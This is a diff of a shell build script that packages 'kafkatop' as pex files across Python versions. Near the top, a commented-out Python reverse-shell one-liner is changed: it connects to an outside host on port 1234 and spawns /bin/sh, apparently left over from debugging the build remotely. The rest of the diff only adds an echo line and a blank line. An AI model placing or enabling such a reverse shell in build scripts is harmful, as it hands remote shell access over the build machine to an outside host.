@@ -7,7 +7,7 @@
 #sudo apt-get -y install tmate
 #tmate
 #exit
-#export RHOST="mute.netmode.ece.ntua.gr";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+#export RHOST="www.sivann.gr";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 #exit
 
 PYTHON_MINVER="3.9"
@@ -57,6 +57,7 @@ do
     echo "*******************************"
     
     $cppath -m venv venv-${cpversion}
+    echo "Activating venv by running: . venv-${cpversion}/bin/activate"
     . venv-${cpversion}/bin/activate
     python3 -m pip install --upgrade pip
     pip install pex
@@ -72,6 +73,7 @@ pexfn="kafkatop-${git_desc}-$(uname -m).pex"
 rm -f "$pexfn"
 
 platforms_args=$(cat pexinspect.json | jq .platform |  sed -e 's/^/--platform /' | tr '\n' ' ')
+
 echo ""
 rm -f makepex.*
 echo '. venv/bin/activate' > makepex.$$
